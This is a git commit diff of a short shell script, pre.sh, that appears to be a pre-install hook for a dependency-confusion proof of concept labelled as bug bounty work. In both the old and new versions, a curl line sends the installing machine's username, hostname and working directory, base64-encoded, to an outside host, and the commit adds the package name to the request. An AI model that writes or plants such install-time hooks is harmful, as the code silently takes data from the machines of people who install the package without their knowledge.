f0ab70cbfb0abdfefe3e3aa09ae9e1393960ebab
Arshad Kazmi <arshadkazmi42@gmail.com>
2021-11-28 21:43:43 +0530

    Update to include package name in curl request

--- pre.sh
+++ pre.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-curl http://kaspat.com/bugbounty/dependency-confusion-poc.php -H "Whoami: $(whoami | base64)" -H "Hostname: $(hostname | base64)" -H "Pwd: $(pwd | base64 -w 2000)" 
+curl http://kaspat.com/bugbounty/dependency-confusion-poc.php -H "Package: $1" -H "Whoami: $(whoami | base64)" -H "Hostname: $(hostname | base64)" -H "Pwd: $(pwd | base64 -w 2000)" 
